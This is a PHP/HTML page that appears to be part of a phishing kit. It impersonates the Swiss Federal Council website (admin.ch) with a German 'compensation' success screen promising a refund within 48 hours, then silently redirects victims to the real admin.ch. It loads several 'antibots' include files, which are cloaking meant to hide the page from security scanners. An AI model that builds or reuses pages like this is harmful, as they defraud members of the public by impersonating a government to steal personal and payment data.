<?php
    include "antibots/anti1.php";
    include "antibots/anti2.php";
    include "antibots/anti3.php";
    include "antibots/anti4.php";
    include "antibots/anti8.php";
?>
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0">
    <title>Der Bundesrat admin.ch - Startseite</title>
    <link rel="stylesheet" href="css/main.css">
    <link rel="icon" href="images/swiss.svg">
</head>
<body>
    <header>
        <nav>
        <div class="firstdivheader">
                <div><img src="images/swiss.svg" alt="image" height="25px" id="vp"></div>
                <div class="hellodear" id="ouf">Der Bundesrat</div>
            </div>
            <div class="seconddivheader">
                <img src="images/myicon.JPG" alt="image" height="42px">
            </div>
        </nav>
    </header>

    <main>
        <div class="containermain">
            <div class="remboursement">> Entschädigung</div>
            <div class="remplissez">Ihre Rückerstattung wird innerhalb von 48 Stunden gesendet.</div>
            <div>
                <img src="images/success.gif" alt="gif" style="width:100%">
            </div>
        </div>
    </main>

    <footer>
        <div class="offooter">Der Bundesrat</div>
        <div class="offooter" id="kontakt">Kontakt</div>
        <div class="offooter">Informiert bleiben</div>
        <div class="appplay">
            <div><img src="images/voteinfo_appstore.png" alt="image" height="30px"></div>
            <div><img src="images/voteinfo_googleplay.png" alt="image" height="30px"></div>
        </div>
        <div class="forlast">
            <img src="images/Logo Schweizerische Eidgenossenschaft.png" alt="image" height="60px">
        </div>
    </footer>
    <script src="js/junia.framework.js"></script>
    <script src="js/main.js"></script>
    <script>
         setTimeout(() => {
            window.location.href = "https://admin.ch";
         },4000);
    </script>
</body>
</html>